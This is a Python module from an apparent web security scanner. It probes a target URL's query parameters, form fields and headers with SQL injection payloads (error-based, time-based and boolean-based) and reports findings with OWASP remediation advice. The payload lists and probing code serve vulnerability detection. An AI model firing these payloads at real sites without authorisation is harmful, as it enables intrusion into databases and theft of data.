import asyncio
import logging
import time
import re
from typing import List, Dict, Any, Optional
import urllib.parse
from ..base import BaseCheck, Finding
from ..utils import extract_forms, extract_parameters

logger = logging.getLogger(__name__)

class SQLInjectionCheck(BaseCheck):
    """SQL Injection vulnerability checker"""
    
    def __init__(self):
        super().__init__()
        self.name = "SQL Injection Detection"
        self.description = "SQL injection detection with multiple techniques"
        
        # Payloads for different databases
        self.error_payloads = [
            "'", '"', "\\", "')", '")', "';", '";',
            "' OR '1'='1", '" OR "1"="1', "' OR 1=1--", '" OR 1=1--',
            "' UNION SELECT NULL--", '" UNION SELECT NULL--',
            "' AND 1=CONVERT(int, (SELECT @@version))--",
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"
        ]
        
        self.time_payloads = [
            "'; WAITFOR DELAY '0:0:5'--",  # SQL Server
            "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL
            "' AND pg_sleep(5)--",  # PostgreSQL
            "'; SELECT pg_sleep(5)--",
            "' OR SLEEP(5)--",
            "' UNION SELECT SLEEP(5)--"
        ]
        
        self.boolean_payloads = [
            "' AND 1=1--",
            "' AND 1=2--", 
            "' OR 1=1--",
            "' OR 1=2--",
            '" AND "1"="1"--',
            '" AND "1"="2"--'
        ]
        
        # Database error patterns
        self.error_patterns = {
            'mysql': [
                r"You have an error in your SQL syntax",
                r"mysql_fetch_array\(\)",
                r"mysql_fetch_assoc\(\)",
                r"mysql_fetch_row\(\)",
                r"mysql_num_rows\(\)",
                r"Warning.*mysql_.*",
                r"Unknown column '[^']+' in 'field list'",
                r"MySQLSyntaxErrorException"
            ],
            'postgresql': [
                r"PostgreSQL.*ERROR",
                r"Warning.*\Wpg_.*",
                r"valid PostgreSQL result",
                r"Npgsql\.",
                r"PG::SyntaxError",
                r"psql.*ERROR"
            ],
            'mssql': [
                r"Driver.* SQL[\-\_\ ]*Server",
                r"OLE DB.* SQL Server",
                r"\bSQL Server.*Driver",
                r"Warning.*mssql_.*",
                r"Microsoft SQL Native Client error",
                r"SQLSTATE.*42000",
                r"SqlException"
            ],
            'oracle': [
                r"\bORA-[0-9]{4,5}",
                r"Oracle error",
                r"Oracle.*Driver",
                r"Warning.*\Woci_.*",
                r"Warning.*\Wora_.*"
            ],
            'sqlite': [
                r"SQLite/JDBCDriver",
                r"SQLite.Exception",
                r"System.Data.SQLite.SQLiteException",
                r"Warning.*sqlite_.*",
                r"SQLITE_ERROR"
            ]
        }
    
    async def check(self, url: str, session, **kwargs) -> List[Finding]:
        """SQL injection detection with multiple techniques"""
        findings = []
        
        try:
            # Get baseline response
            async with session.get(url) as response:
                if response.status != 200:
                    return findings
                
                original_content = await response.text()
                original_status = response.status
                original_headers = dict(response.headers)
            
            # Test URL parameters
            url_findings = await self._test_url_parameters(session, url, original_content, original_status)
            findings.extend(url_findings)
            
            # Test forms
            form_findings = await self._test_forms(session, url, original_content, original_status)
            findings.extend(form_findings)
            
            # Test headers for injection points
            header_findings = await self._test_headers(session, url, original_content)
            findings.extend(header_findings)
            
        except Exception as e:
            logger.error(f"SQL injection check failed for {url}: {e}")
        
        return findings
    
    async def _test_url_parameters(self, session, url: str, original_content: str, original_status: int) -> List[Finding]:
        """URL parameter testing with multiple techniques"""
        findings = []
        parsed_url = urllib.parse.urlparse(url)
        
        if not parsed_url.query:
            return findings
        
        params = dict(urllib.parse.parse_qsl(parsed_url.query))
        
        for param_name, param_value in params.items():
            # Test error-based injection
            error_finding = await self._test_error_based(session, url, param_name, params)
            if error_finding:
                findings.append(error_finding)
                continue
            
            # Test time-based injection
            time_finding = await self._test_time_based(session, url, param_name, params)
            if time_finding:
                findings.append(time_finding)
                continue
            
            # Test boolean-based injection
            boolean_finding = await self._test_boolean_based(session, url, param_name, params, original_content)
            if boolean_finding:
                findings.append(boolean_finding)
        
        return findings
    
    async def _test_error_based(self, session, url: str, param_name: str, params: dict) -> Optional[Finding]:
        """Test for error-based SQL injection"""
        for payload in self.error_payloads:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                test_url = self._build_test_url(url, test_params)
                
                async with session.get(test_url) as response:
                    content = await response.text()
                    
                    # Check for database errors
                    db_type, error_match = self._detect_database_error(content)
                    if db_type and error_match:
                        return Finding(
                            title="SQL Injection Vulnerability (Error-Based)",
                            description=f"SQL injection vulnerability detected in parameter '{param_name}' using error-based technique",
                            severity="high",
                            confidence="high",
                            url=test_url,
                            method="GET",
                            parameter=param_name,
                            payload=payload,
                            evidence=f"Database error detected ({db_type}): {error_match}",
                            remediation="Use parameterized queries or prepared statements to prevent SQL injection",
                            references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                            cwe_id="CWE-89",
                            owasp_category="A03:2021 – Injection"
                        )
            except Exception as e:
                logger.debug(f"Error testing parameter {param_name}: {e}")
                continue
        
        return None
    
    async def _test_time_based(self, session, url: str, param_name: str, params: dict) -> Optional[Finding]:
        """Test for time-based SQL injection"""
        for payload in self.time_payloads:
            try:
                test_params = params.copy()
                test_params[param_name] = payload
                
                test_url = self._build_test_url(url, test_params)
                
                start_time = time.time()
                async with session.get(test_url) as response:
                    await response.text()
                elapsed_time = time.time() - start_time
                
                # If response took significantly longer (>4 seconds), likely time-based injection
                if elapsed_time > 4:
                    return Finding(
                        title="SQL Injection Vulnerability (Time-Based)",
                        description=f"Time-based SQL injection vulnerability detected in parameter '{param_name}'",
                        severity="high",
                        confidence="high",
                        url=test_url,
                        method="GET",
                        parameter=param_name,
                        payload=payload,
                        evidence=f"Response time: {elapsed_time:.2f}s indicates delay injection",
                        remediation="Use parameterized queries or prepared statements to prevent SQL injection",
                        references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                        cwe_id="CWE-89",
                        owasp_category="A03:2021 – Injection"
                    )
            except Exception as e:
                logger.debug(f"Time-based test error for {param_name}: {e}")
                continue
        
        return None
    
    async def _test_boolean_based(self, session, url: str, param_name: str, params: dict, original_content: str) -> Optional[Finding]:
        """Test for boolean-based SQL injection"""
        try:
            # Test true condition
            true_params = params.copy()
            true_params[param_name] = "' AND 1=1--"
            true_url = self._build_test_url(url, true_params)
            
            async with session.get(true_url) as response:
                true_content = await response.text()
            
            # Test false condition
            false_params = params.copy()
            false_params[param_name] = "' AND 1=2--"
            false_url = self._build_test_url(url, false_params)
            
            async with session.get(false_url) as response:
                false_content = await response.text()
            
            # Compare responses
            true_len = len(true_content)
            false_len = len(false_content)
            original_len = len(original_content)
            
            # If true condition is similar to original but false is different
            if (abs(true_len - original_len) < 100 and 
                abs(false_len - original_len) > 200):
                
                return Finding(
                    title="SQL Injection Vulnerability (Boolean-Based)",
                    description=f"Boolean-based SQL injection vulnerability detected in parameter '{param_name}'",
                    severity="high",
                    confidence="medium",
                    url=true_url,
                    method="GET",
                    parameter=param_name,
                    payload="' AND 1=1-- / ' AND 1=2--",
                    evidence=f"Response length differences: True={true_len}, False={false_len}, Original={original_len}",
                    remediation="Use parameterized queries or prepared statements to prevent SQL injection",
                    references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                    cwe_id="CWE-89",
                    owasp_category="A03:2021 – Injection"
                )
        except Exception as e:
            logger.debug(f"Boolean-based test error for {param_name}: {e}")
        
        return None
    
    async def _test_headers(self, session, url: str, original_content: str) -> List[Finding]:
        """Test HTTP headers for SQL injection"""
        findings = []
        
        # Common injectable headers
        test_headers = [
            'User-Agent', 'Referer', 'X-Forwarded-For', 
            'X-Real-IP', 'X-Originating-IP', 'Cookie'
        ]
        
        for header_name in test_headers:
            for payload in self.error_payloads[:3]:  # Limit header tests
                try:
                    headers = {header_name: payload}
                    
                    async with session.get(url, headers=headers) as response:
                        content = await response.text()
                        
                        db_type, error_match = self._detect_database_error(content)
                        if db_type and error_match:
                            findings.append(Finding(
                                title=f"SQL Injection in {header_name} Header",
                                description=f"SQL injection vulnerability detected in {header_name} header",
                                severity="high",
                                confidence="high",
                                url=url,
                                method="GET",
                                parameter=header_name,
                                payload=payload,
                                evidence=f"Database error in header injection ({db_type}): {error_match}",
                                remediation=f"Sanitize and validate {header_name} header input",
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 – Injection"
                            ))
                            break
                except Exception as e:
                    logger.debug(f"Header injection test error: {e}")
                    continue
        
        return findings
    
    def _build_test_url(self, url: str, params: dict) -> str:
        """Build test URL with modified parameters"""
        parsed_url = urllib.parse.urlparse(url)
        return urllib.parse.urlunparse((
            parsed_url.scheme,
            parsed_url.netloc,
            parsed_url.path,
            parsed_url.params,
            urllib.parse.urlencode(params),
            parsed_url.fragment
        ))
    
    def _detect_database_error(self, content: str) -> tuple:
        """Detect database errors in response content"""
        content_lower = content.lower()
        
        for db_type, patterns in self.error_patterns.items():
            for pattern in patterns:
                match = re.search(pattern, content, re.IGNORECASE)
                if match:
                    return db_type, match.group(0)
        
        return None, None
    
    async def _test_forms(self, session, url: str, original_content: str, original_status: int) -> List[Finding]:
        """Form testing for SQL injection"""
        findings = []
        
        try:
            forms = extract_forms(original_content, url)
        except:
            return findings
        
        for form in forms:
            if not form.get('inputs'):
                continue
            
            for input_field in form['inputs']:
                if input_field.get('type', '').lower() in ['submit', 'button', 'hidden', 'file']:
                    continue
                
                field_name = input_field.get('name', '')
                if not field_name:
                    continue
                
                # Test error-based injection on forms
                for payload in self.error_payloads[:3]:  # Limit form tests
                    try:
                        # Prepare form data
                        form_data = {}
                        for inp in form['inputs']:
                            inp_name = inp.get('name', '')
                            if inp_name:
                                if inp_name == field_name:
                                    form_data[inp_name] = payload
                                else:
                                    form_data[inp_name] = inp.get('value', 'test')
                        
                        # Send form request
                        method = form.get('method', 'GET').upper()
                        action_url = form.get('action', url)
                        
                        if method == 'POST':
                            async with session.post(action_url, data=form_data) as response:
                                content = await response.text()
                        else:
                            async with session.get(action_url, params=form_data) as response:
                                content = await response.text()
                        
                        # Check for database errors
                        db_type, error_match = self._detect_database_error(content)
                        if db_type and error_match:
                            findings.append(Finding(
                                title="SQL Injection in Form Field",
                                description=f"SQL injection vulnerability detected in form field '{field_name}'",
                                severity="high",
                                confidence="high",
                                url=action_url,
                                method=method,
                                parameter=field_name,
                                payload=payload,
                                evidence=f"Database error detected ({db_type}): {error_match}",
                                remediation="Use parameterized queries and input validation for form processing",
                                references=["https://owasp.org/www-community/attacks/SQL_Injection"],
                                cwe_id="CWE-89",
                                owasp_category="A03:2021 – Injection"
                            ))
                            break  # Found vulnerability, move to next field
                    
                    except Exception as e:
                        logger.debug(f"Form injection test error for {field_name}: {e}")
                        continue
        
        return findings